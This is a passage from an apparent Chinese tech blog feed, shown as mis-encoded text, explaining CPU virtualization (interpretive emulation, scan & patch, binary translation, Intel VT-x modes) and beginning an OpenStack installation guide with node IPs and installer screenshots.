è§£é‡Šæ‰§è¡Œ</h4><p><strong>ã€Œæ¨¡æ‹Ÿã€</strong>ï¼ˆEmulateï¼‰æŠ€æœ¯çš„å‡ºç°å…¶å®æ—©äºè™šæ‹ŸåŒ–ï¼Œçº¯è½¯ä»¶çš„æ¨¡æ‹Ÿæœ¬è´¨ä¸Šå°±æ˜¯é€šè¿‡<strong>ç¼–å†™èƒ½å¤Ÿå‘ˆç°å‡ºä¸è¢«æ¨¡æ‹Ÿå¯¹è±¡ç›¸åŒè¡Œä¸ºçš„åº”ç”¨ç¨‹å¼ä»è€Œè¾¾åˆ°è¿è¡ŒéåŒæ„å¹³å°åº”ç”¨ç¨‹åºçš„æ•ˆæœ</strong>ã€‚</p><p>æ¨¡æ‹ŸæŠ€æœ¯ä¸ä»…èƒ½å¤Ÿåº”ç”¨äºç¨‹åºçº§åˆ«çš„æ¨¡æ‹Ÿï¼Œè¿˜èƒ½åº”ç”¨äºç³»ç»Ÿçº§åˆ«çš„æ¨¡æ‹Ÿï¼šCPU è¿è¡Œçš„æœ¬è´¨è¡Œä¸ºå…¶å®å°±æ˜¯<strong>ä» PC å¯„å­˜å™¨æ‰€æŒ‡å†…å­˜åŒºåŸŸä¸­ä¸æ–­å–å‡ºæŒ‡ä»¤è§£ç æ‰§è¡Œ</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå®ç°ä¸€ä¸ªè™šæ‹Ÿæœºæœ€ç®€å•ç²—æš´çš„æ–¹æ³•ä¾¿æ˜¯é€šè¿‡<strong>æ¨¡æ‹Ÿæ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”çš„è¡Œä¸ºï¼Œä»è€Œä½¿å¾— VM çš„è¡Œä¸ºå¯¹ VMM è€Œè¨€æ˜¯å®Œå…¨å¯æ§çš„</strong>ã€‚</p><p>å®ç°æ¨¡æ‹ŸæŠ€æœ¯çš„åŸç†ä¹Ÿæ˜¯æœ€ç®€å•çš„â€”â€”æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>è§£é‡Šæ‰§è¡Œ</strong>çš„æ–¹å¼æ¥å®ç°æ¨¡æ‹ŸæŠ€æœ¯ï¼Œå³æ¨¡æ‹Ÿå™¨ç¨‹åºä¸æ–­åœ°ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ï¼Œå¹¶æ¨¡æ‹Ÿå‡ºæ¯ä¸€æ¡æŒ‡ä»¤çš„æ•ˆæœã€‚ä»æŸç§ç¨‹åº¦è€Œè¨€ï¼Œ<strong>æ¯ä¸€æ¡æŒ‡ä»¤åœ¨æ‰§è¡Œæ—¶éƒ½å®Œæˆäº† â€œé™·å…¥â€</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯è§£å†³è™šæ‹ŸåŒ–çš„æ¼æ´ï¼ŒåŒæ—¶è¿˜èƒ½æ¨¡æ‹Ÿä¸ç‰©ç†æœºä¸åŒæ¶æ„çš„è™šæ‹Ÿæœº</p><p><strong>Qemu</strong>â€”â€”<code>Quick Emulator</code> æœ¬è´¨ä¸Šä¾¿æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œå…¶<strong>å®Œæ•´åœ°æ¨¡æ‹Ÿäº†ä¸€å¥—åŒ…æ‹¬å„ç§å¤–è®¾åœ¨å†…çš„è®¡ç®—æœºç³»ç»Ÿ</strong>ã€‚</p><p>ä¸è¿‡åŸºäºè§£é‡Šæ‰§è¡Œçš„æ¨¡æ‹ŸæŠ€æœ¯æœ‰ç€ä¸€ä¸ªéå¸¸è‡´å‘½çš„ç¼ºç‚¹â€”â€”<strong>æ€§èƒ½æå·®</strong>ï¼Œå› ä¸ºæ¯ä¸€æ¡æŒ‡ä»¤éƒ½éœ€è¦ç»è¿‡ VMM çš„è§£æåå†ç”± VMM æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå“ªæ€•æœ€ç®€å•çš„ä¸€æ¡æŒ‡ä»¤ä¹Ÿå¯èƒ½éœ€è¦åˆ†è§£æˆå¤šä¸ªæ­¥éª¤ä¸å¤šæ¬¡å†…å­˜è®¿é—®ï¼Œæ•ˆç‡æä½ã€‚</p><p>è®©æˆ‘ä»¬é‡æ–°å®¡è§†æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦åœ¨ x86 æ¶æ„ä¸Šä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯æ¥å®ç°è™šæ‹Ÿæœºï¼šéç‰¹æƒæ•æ„ŸæŒ‡ä»¤çš„å­˜åœ¨æ‰“ç ´äº† <code>Popek and Goldberg virtualization requirements</code>ï¼Œä½†<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ä»…æ˜¯å°‘æ•°ï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤æˆ‘ä»¬ä»èƒ½ç›´æ¥åœ¨ç‰©ç†ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œå› æ­¤åŸºäºæ¨¡æ‹ŸæŠ€æœ¯è¿›è¡Œæ”¹è¿›çš„è™šæ‹ŸåŒ–æŠ€æœ¯å‡ºç°äº†ï¼š<code>æ‰«æ &amp; ä¿®è¡¥</code> ä¸ <code>äºŒè¿›åˆ¶ç¿»è¯‘</code>ã€‚</p><h4 id="æ‰«æ-ä¿®è¡¥">æ‰«æ &amp; ä¿®è¡¥</h4><p>è™šæ‹ŸåŒ–åœºæ™¯ä¸‹çš„è™šæ‹Ÿæœºå¤§éƒ½æ˜¯ä¸ç‰©ç†æœºæœ‰ç€ç›¸åŒçš„ ISAï¼Œå› æ­¤æˆ‘ä»¬å¹¶æ²¡æœ‰å¿…è¦é‡‡ç”¨çº¯æ¨¡æ‹Ÿçš„æŠ€æœ¯å®ç°è™šæ‹Ÿæœºï¼Œè€Œæ˜¯å¯ä»¥<strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œé€šè¿‡æŸç§æ–¹å¼è®©éç‰¹æƒæ•æ„ŸæŒ‡ä»¤é™·å…¥ VMM</strong>ï¼Œä»è€Œé‡æ–°å®ç° Trap &amp; Emulate æ¨¡å‹ã€‚</p><p><strong>æ‰«æ &amp; ä¿®è¡¥</strong>ï¼ˆScan &amp; Patchï¼‰ä¾¿æ˜¯è¿™æ ·çš„ä¸€ç§æŠ€æœ¯ï¼Œå…¶<strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ</strong>ï¼ŒåŒæ—¶<strong>å°†ç³»ç»Ÿä»£ç ä¸­çš„æ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºè·³è½¬æŒ‡ä»¤ç­‰èƒ½é™·å…¥ VMM ä¸­çš„æŒ‡ä»¤</strong>ï¼Œä»è€Œè®© VM åœ¨æ‰§è¡Œæ•æ„ŸæŒ‡ä»¤æ—¶èƒ½é™·å…¥ VMMï¼Œä½¿å¾— VMM èƒ½å¤Ÿæ¨¡æ‹Ÿæ‰§è¡Œæ•æ„ŸæŒ‡ä»¤çš„æ•ˆæœã€‚</p><p>åŸºæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>VMM åœ¨ VM æ‰§è¡Œæ¯æ®µä»£ç ä¹‹å‰å¯¹å…¶è¿›è¡Œæ‰«æï¼Œè§£ææ¯ä¸€æ¡æŒ‡ä»¤ï¼ŒæŸ¥æ‰¾ç‰¹æƒä¸æ•æ„ŸæŒ‡ä»¤</li><li>VMM åŠ¨æ€ç”Ÿæˆç›¸åº”æŒ‡ä»¤çš„è¡¥ä¸ä»£ç ï¼Œå¹¶å°†åŸæ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºä¸€ä¸ªå¤–è·³è½¬ä»¥é™·å…¥ VMMï¼Œä»è€Œåœ¨ VMM ä¸­æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„è¡¥ä¸ä»£ç </li><li>è¡¥ä¸ä»£ç æ‰§è¡Œç»“æŸåï¼Œå†è·³è½¬å› VM ä¸­ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ä»£ç </li></ul><p>åœ¨ã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯å½“ä¸­å¤§éƒ¨åˆ†çš„ä»£ç éƒ½å¯ä»¥ç›´æ¥åœ¨ç‰©ç† CPU ä¸Šè¿è¡Œï¼Œå…¶æ€§èƒ½æŸå¤±è¾ƒå°ï¼Œä½†ã€Œæ‰«æ &amp; ä¿®è¡¥ã€åŒæ ·å­˜åœ¨ç€ä¸€å®šçš„ç¼ºé™·ï¼š</p><ul><li>ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤ä»é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œçš„æ–¹å¼å®Œæˆï¼Œä»å¯èƒ½é€ æˆä¸€å®šçš„æ€§èƒ½æŸå¤±</li><li>ä»£ç è¡¥ä¸å½“ä¸­å¼•å…¥äº†é¢å¤–çš„è·³è½¬ï¼Œè¿™ç ´åäº†ä»£ç çš„å±€éƒ¨æ€§</li></ul><blockquote><p>å±€éƒ¨æ€§åŸç†ï¼šCPU å­˜å–æŒ‡ä»¤ / æ•°æ®çš„å†…å­˜å•å…ƒåº”å½“è¶‹å‘äºèšé›†åœ¨ä¸€ä¸ªè¾ƒå°çš„åŒºåŸŸ</p></blockquote><ul><li>VMM éœ€è¦ç»´æŠ¤ä¸€ä»½è¡¥ä¸ä»£ç å¯¹åº”çš„åŸå§‹ä»£ç çš„å‰¯æœ¬ï¼Œè¿™é€ æˆäº†é¢å¤–çš„å¼€é”€</li></ul><h4 id="äºŒè¿›åˆ¶ç¿»è¯‘">äºŒè¿›åˆ¶ç¿»è¯‘</h4><p>ä¸ºäº†è¿›ä¸€æ­¥åœ°æé«˜è™šæ‹ŸåŒ–çš„æ€§èƒ½ï¼Œ<strong>ã€ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘ã€</strong>ï¼ˆBinary Translationï¼‰æŠ€æœ¯åº”è¿è€Œç”Ÿï¼Œç±»ä¼¼äºã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯ï¼ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘åŒæ ·ä¼šåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°ä¿®æ”¹ä»£ç ï¼Œä¸è¿‡ä¸åŒçš„æ˜¯ BT æŠ€æœ¯ä»¥<strong>åŸºæœ¬å—</strong>ï¼ˆåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£çš„ä»£ç å—ï¼‰ä½œä¸ºç¿»è¯‘çš„å•ä½ï¼š</p><ul><li>Emulator å¯¹è¯»å…¥çš„äºŒè¿›åˆ¶ä»£ç <strong>ç¿»è¯‘</strong>è¾“å‡ºä¸ºå¯¹åº” ISA çš„ä¸€ä¸ª<strong>ä¸åŒ…å«ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤çš„å­é›†</strong>æ‰€æ„æˆçš„ä»£ç ï¼Œä½¿å…¶å¯ä»¥åœ¨ç”¨æˆ·æ€ä¸‹å®‰å…¨è¿è¡Œ</li><li>Emulator åŠ¨æ€åœ°ä¸ºå½“å‰è¦è¿è¡Œçš„åŸºæœ¬å—å¼€è¾Ÿä¸€å—ç©ºé—´ï¼Œç§°ä¹‹ä¸º<strong>ç¿»è¯‘ç¼“å­˜</strong>ï¼ˆtranslation cacheï¼‰ï¼Œåœ¨å…¶ä¸­å­˜æ”¾ç€ç¿»è¯‘åçš„ä»£ç ï¼Œæ¯ä¸€å— TC ä¸åŸä»£ç ä»¥æŸç§æ˜ å°„å…³ç³»ï¼ˆä¾‹å¦‚å“ˆå¸Œè¡¨ï¼‰è¿›è¡Œå…³è”</li></ul><blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¸æ‰«æä¿®è¡¥æŠ€æœ¯çš„åŸç†å¤§ä½“ä¸Šæ˜¯éå¸¸ç±»ä¼¼çš„ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¼šå¯¹æ‰€æœ‰çš„ä»£ç è¿›è¡Œç¿»è¯‘ï¼Œè€Œæ‰«æä¸ä¿®è¡¥æŠ€æœ¯åˆ™åªä¼š patch æ‰æ•æ„ŸæŒ‡ä»¤ä¸ç‰¹æƒæŒ‡ä»¤ï¼›åŒæ—¶æ‰«æ &amp; ä¿®è¡¥æŠ€æœ¯<strong>ä¸ä¼šæ”¹å˜ä»£ç çš„æ•´ä½“ç»“æ„</strong>ï¼Œè€Œä»…æ˜¯å°†æ•æ„Ÿä¸ç‰¹æƒæŒ‡ä»¤æ›¿æ¢ä¸ºèƒ½è§¦å‘é™·å…¥ VMM çš„æŒ‡ä»¤ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯<strong>ä¼šç›´æ¥æ”¹å˜ä¸€ä¸ªåŸºæœ¬å—çš„ä»£ç æ•´ä½“ç»“æ„</strong>ï¼ˆä¾‹å¦‚ç¿»è¯‘å‰åŸºæœ¬å—å¯èƒ½é•¿åº¦ 40Bï¼Œç¿»è¯‘åå˜æˆ 100Bï¼Œå†…éƒ¨ä»£ç çš„ç›¸å¯¹ä½ç½®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼‰ã€‚</p></blockquote><p>ç¿»è¯‘æ–¹æ³•å¤§è‡´åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ï¼š</p><ul><li><strong>ç®€å•ç¿»è¯‘</strong>ï¼šå¯ä»¥ç›´æ¥ç†è§£ä¸º<strong>ç­‰æ•ˆä»£ç æ¨¡æ‹Ÿ</strong>ï¼Œè¿™ç§æ–¹æ³•å®ç°è¾ƒä¸ºç®€å•ï¼Œä½†æ˜¯ä¼šè®©æŒ‡ä»¤æ•°é‡å¤§å¹…è†¨èƒ€ã€‚</li><li><strong>ç­‰å€¼ç¿»è¯‘</strong>ï¼šç¿»è¯‘çš„<strong>åŸä»£ç ä¸ç»“æœä»£ç ç›¸åŒ</strong>ã€‚ç†è®ºä¸Šå¤§å¤šæ•°æŒ‡ä»¤éƒ½å¯ä»¥ä½¿ç”¨ç­‰å€¼ç¿»è¯‘ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œä½†è¿™éœ€è¦æ›´å¤æ‚çš„åŠ¨æ€åˆ†ææŠ€æœ¯ã€‚</li></ul><p>åœ¨ç›¸åŒ ISA æ¶æ„ä¸Šå¤§éƒ¨åˆ†æŒ‡ä»¤éƒ½æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œç­‰å€¼ç¿»è¯‘çš„ï¼Œé™¤äº†ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>PC ç›¸å¯¹å¯»å€æŒ‡ä»¤ã€‚è¿™ç±»æŒ‡ä»¤çš„å¯»å€ä¸ PC ç›¸å…³ï¼Œä½†åœ¨è¿›è¡ŒäºŒè¿›åˆ¶ç¿»è¯‘åæ›´æ”¹äº†ä»£ç åŸºæœ¬å—çš„ç»“æ„ï¼Œå› æ­¤è¿™ç±»æŒ‡ä»¤éœ€è¦é¢å¤–æ’å…¥ä¸€äº›è¡¥å¿ä»£ç æ¥ç¡®ä¿å¯»å€çš„å‡†ç¡®ï¼Œè¿™é€ æˆäº†ä¸€å®šçš„æ€§èƒ½æŸå¤±ã€‚</li><li>ç›´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬å‡½æ•°è°ƒç”¨ä¸è·³è½¬æŒ‡ä»¤ï¼Œå…¶ç›®æ ‡åœ°å€éœ€è¦è¢«æ›¿æ¢ä¸ºç”Ÿæˆä»£ç çš„åœ°å€ã€‚</li><li>é—´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬é—´æ¥è°ƒç”¨ã€è¿”å›ã€é—´æ¥è·³è½¬ï¼Œå…¶ç›®æ ‡åœ°å€æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€å¾—åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•åœ¨ç¿»è¯‘æ—¶ç¡®å®šè·³è½¬ç›®æ ‡ã€‚</li><li>ç‰¹æƒæŒ‡ä»¤ã€‚å¯¹äºç®€å•çš„ç‰¹æƒæŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç±»ä¼¼çš„ç­‰å€¼ä»£ç ï¼ˆä¾‹å¦‚ cli æŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç½® vcpu çš„ flags å¯„å­˜å™¨çš„ IF ä½ä¸º 0ï¼‰ï¼Œä½†å¯¹äºç¨å¾®å¤æ‚ä¸€ç‚¹çš„æŒ‡ä»¤ï¼Œåˆ™éœ€è¦è¿›è¡Œæ·±åº¦æ¨¡æ‹Ÿï¼Œåˆ©ç”¨è·³è½¬æŒ‡ä»¤é™·å…¥ VMM ä¸­ï¼Œè¿™é€šå¸¸ä¼šé€ æˆä¸€å®šçš„æ€§èƒ½å¼€é”€ã€‚</li></ul><p>ç”±äºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä½¿ç”¨äº†æ›´ä¸ºå¤æ‚çš„è¿‡ç¨‹ï¼Œç”±æ­¤ä¹Ÿä¼šå¼•å…¥æ›´å¤šçš„é—®é¢˜ï¼Œå¯¹äºä»¥ä¸‹æƒ…å½¢åˆ™éœ€è¦é¢å¤–çš„å¤„ç†ï¼š</p><ul><li>è‡ªä¿®æ”¹ä»£ç ï¼ˆSelf Modifying Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œæ—¶ä¿®æ”¹è‡ªèº«æ‰€æ‰§è¡Œçš„ä»£ç ï¼Œè¿™éœ€è¦æˆ‘ä»¬çš„ Emulator å¯¹æ–°ç”Ÿæˆçš„ä»£ç è¿›è¡Œé‡ç¿»è¯‘ã€‚</li><li>è‡ªå‚è€ƒä»£ç ï¼ˆSelf Referential Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œä¸­è¯»å–è‡ªå·±çš„ä»£ç æ®µä¸­å†…å®¹ï¼Œè¿™éœ€è¦æˆ‘ä»¬é¢å¤–è¿›è¡Œå¤„ç†ï¼Œä½¿å…¶è¯»å–åŸä»£ç æ®µä¸­å†…å®¹è€Œéç¿»è¯‘åçš„ä»£ç ã€‚</li><li>ç²¾ç¡®å¼‚å¸¸ï¼ˆPrecise Exceptionsï¼‰ã€‚å³åœ¨ç¿»è¯‘ä»£ç æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œè¿™éœ€è¦å°†è¿è¡ŒçŠ¶æ€æ¢å¤åˆ°åŸä»£ç æ‰§è¡Œåˆ°å¼‚å¸¸ç‚¹æ—¶çš„çŠ¶æ€ï¼Œä¹‹åå†äº¤ç»™ Guest OS å¤„ç†ã€‚BT æŠ€æœ¯æš‚å¾ˆéš¾å¾ˆå¥½åœ°å¤„ç†è¿™ç§æƒ…å†µï¼Œå› ä¸ºç¿»è¯‘åçš„ä»£ç ä¸åŸä»£ç å·²ç»å¤±å»äº†é€æ¡å¯¹åº”çš„å…³ç³»ã€‚ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶è¿›è¡Œå›æ»šï¼Œä¹‹åé‡æ–°ä½¿ç”¨è§£é‡Šæ‰§è¡Œçš„æ–¹å¼ã€‚</li><li>å®æ—¶ä»£ç ã€‚è¿™ç±»ä»£ç å¯¹äºå®æ—¶æ€§è¦æ±‚è¾ƒé«˜ï¼Œåœ¨æ¨¡æ‹Ÿç¯å¢ƒä¸‹è¿è¡Œä¼šæŸå¤±æ—¶é—´ç²¾ç¡®æ€§ï¼Œç›®å‰æš‚æ—¶æ— æ³•è§£å†³ã€‚</li></ul><h3 id="ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–-2">ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–</h3><p>Intel VT æŠ€æœ¯æ˜¯ Intel ä¸º x86 è™šæ‹ŸåŒ–æ‰€æä¾›çš„ç¡¬ä»¶æ”¯æŒï¼Œå…¶ä¸­ç”¨äºè¾…åŠ© CPU è™šæ‹ŸåŒ–çš„æ˜¯ <code>Intel VT-x</code> æŠ€æœ¯ï¼Œå…¶æ‰©å±•äº†ä¼ ç»Ÿçš„ IA32 å¤„ç†å™¨æ¶æ„ï¼Œä¸º IA32 æ¶æ„çš„ CPU è™šæ‹ŸåŒ–æä¾›äº†ç¡¬ä»¶æ”¯æŒã€‚</p><p>VT-x æŠ€æœ¯ä¸º Intel CPU é¢å¤–å¼•å…¥äº†ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼Œç»Ÿç§°ä¸º <strong>VMX æ“ä½œæ¨¡å¼</strong>ï¼ˆVirtual Machine eXtensionsï¼‰ï¼Œé€šè¿‡ <code>vmxon</code> æŒ‡ä»¤å¼€å¯ï¼Œè¿™ä¸¤ç§è¿è¡Œæ¨¡å¼<strong>éƒ½ç‹¬ç«‹æœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯</strong>ï¼š</p><ul><li><code>VMX Root Operation</code>ï¼šHypervisor æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹å¯ä»¥è®¿é—®è®¡ç®—æœºçš„æ‰€æœ‰èµ„æºï¼Œå¹¶å¯¹ VM è¿›è¡Œè°ƒåº¦ã€‚</li><li><code>VMX Non-Root Operation</code>ï¼šVM æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ä»…èƒ½è®¿é—®éæ•æ„Ÿèµ„æºï¼Œå¯¹äºæ•æ„Ÿèµ„æºçš„è®¿é—®ï¼ˆä¾‹å¦‚ I/O æ“ä½œï¼‰ä¼šä½¿å¾— CPU é€€å‡º Non-Root æ¨¡å¼å¹¶é™·å…¥ Hypervisor ä¸­ï¼Œç”± Hypervisor å¤„ç†åå†é‡æ–°è¿›å…¥ Non-Root æ¨¡å¼æ¢å¤ VM çš„è¿è¡Œã€‚</li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯¹ Root æ¨¡å¼ä¸ Non-Root æ¨¡å¼é—´çš„åˆ‡æ¢è¡Œä¸ºè¿›è¡Œå®šä¹‰ï¼š</p><ul><li><code>VM-Entry</code>ï¼šHypervisor ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Non-Root æ¨¡å¼ï¼Œè½½å…¥ VM çŠ¶æ€ä¿¡æ¯ï¼Œæ¢å¤ VM æ‰§è¡Œæµã€‚</li><li><code>VM-Exit</code>ï¼šVM è¿è¡Œæš‚åœå¹¶ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Root æ¨¡å¼ï¼Œè½½å…¥ Hypervisor çŠ¶æ€ä¿¡æ¯ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/intel-vt-x-mode.png" alt="intel-vt-x-mode"></p><p>ç”±äº Non-Root æ¨¡å¼ä¸ Root æ¨¡å¼éƒ½å„è‡ªæœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯ï¼Œå› æ­¤ Host OS ä¸ Guest OS éƒ½å¯ä»¥<strong>ä¸åŠ ä¿®æ”¹åœ°åœ¨è‡ªå·±å¯¹åº”çš„æ¨¡å¼ä¸‹ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œä»…æœ‰å½“ Guest OS æ¶‰åŠåˆ°æ•æ„Ÿèµ„æºçš„è®¿é—®åŠ Host OS å¯¹ VM çš„è°ƒåº¦æ—¶æ‰ä¼šå‘ç”Ÿåˆ‡æ¢ï¼Œè¿™åœ¨ç¡®ä¿äº† VM é«˜æ€§èƒ½çš„åŒæ—¶æ»¡è¶³äº† <code>Trap &amp; Emulate</code> æ¨¡å‹å®ç°ï¼Œä¹Ÿè§£å†³äº† x86 æ¶æ„çš„è™šæ‹ŸåŒ–æ¼æ´ã€‚</p><h4 id="VMCS">VMCS</h4>]]></content>
    
    
    
    <tags>
      
      <tag>è™šæ‹ŸåŒ–æŠ€æœ¯</tag>
      
      <tag>ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenStackå¹³å°æ­å»º</title>
    <link href="/2025/01/08/OpenStack%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/01/08/OpenStack%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>æ¶¨äº†ä¸€ä¸ªå¤§æ•™è®­ï¼Œä»¥åå¦‚æœæœ‰å®˜æ–¹å‡†å¤‡çš„å®‰è£…è¯´æ˜æ–‡æ¡£å°±å†ä¹Ÿä¸çœ‹ç½‘ä¸Šçš„å®‰è£…æ•™ç¨‹äº†ã€‚å¾ˆå¤šæ­¥éª¤çš„ç»†èŠ‚éƒ½ä¸è¯´æ˜ç™½ï¼Œå¯¼è‡´ä¸€ç›´æŠ¥é”™ï¼Œä½œè€…ä¹Ÿä¸æé†’ã€‚</p><h1 id="åŸºç¡€ç¯å¢ƒ-ä¸»æœºå‡†å¤‡">åŸºç¡€ç¯å¢ƒ-ä¸»æœºå‡†å¤‡</h1><p>OpenStackäº‘å¹³å°æ­å»ºéœ€è¦ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæ˜¯controllerï¼ˆæ§åˆ¶èŠ‚ç‚¹ï¼‰ï¼Œå¦ä¸€ä¸ªæ˜¯computeï¼ˆè®¡ç®—èŠ‚ç‚¹ï¼‰ã€‚</p><table><thead><tr><th>åç§°</th><th>IPåœ°å€</th><th>ä¸»æœºåç§°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>æ§åˆ¶èŠ‚ç‚¹</td><td>192.168.146.150</td><td>controller</td><td>æœ€å°4G,å¼€å¯è™šæ‹ŸåŒ–</td></tr><tr><td>è®¡ç®—èŠ‚ç‚¹</td><td>192.168.146.200</td><td>compute1</td><td>æœ€å°2G,å¼€å¯è™šæ‹ŸåŒ–</td></tr></tbody></table><h2 id="controllerï¼ˆæ§åˆ¶èŠ‚ç‚¹ï¼‰">controllerï¼ˆæ§åˆ¶èŠ‚ç‚¹ï¼‰</h2><h3 id="ä¸»æœºå®‰è£…">ä¸»æœºå®‰è£…</h3><p>æˆ‘æ²¡æœ‰æˆªå›¾æ ‡æ³¨çš„éƒ¨åˆ†ç›´æ¥ä¸‹ä¸€æ­¥ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108195647601.png" alt="image-20250108195647601"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108195733468.png" alt="image-20250108195733468"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200006319.png" alt="image-20250108200006319"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200024404.png" alt="image-20250108200024404"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200035684.png" alt="image-20250108200035684"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200156324.png" alt="image-20250108200156324"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200437838.png" alt="image-20250108200437838"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200604120.png" alt="image-20250108200604120"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202418908.png" alt="image-20250108202418908"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200727741.png" alt="image-20250108200727741"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200821337.png" alt="image-20250108200821337"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202506210.png" alt="image-20250108202506210"></p><blockquote><p>æ­¤è®¾ç½®æ˜¯ä¸ºäº†ä¿®æ”¹ç½‘å¡å‘½åè§„åˆ™ä¸ºethè§„åˆ™</p></blockquote><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202612173.png" alt="image-20250108202612173"></p><p>ä¹‹åæŒ‰ä¸Šä¸‹ç®­å¤´é€‰ä¸­Install CentOS 7ï¼Œä¸è¦æŒ‰å›è½¦ï¼ŒéšåæŒ‰ä¸‹tabé”®ã€‚</p><p>æŒ‰ä¸‹ç©ºæ ¼ï¼Œè¾“å…¥å¦‚ä¸‹æŒ‡ä»¤åï¼ŒæŒ‰å›è½¦é”®ã€‚</p><figure 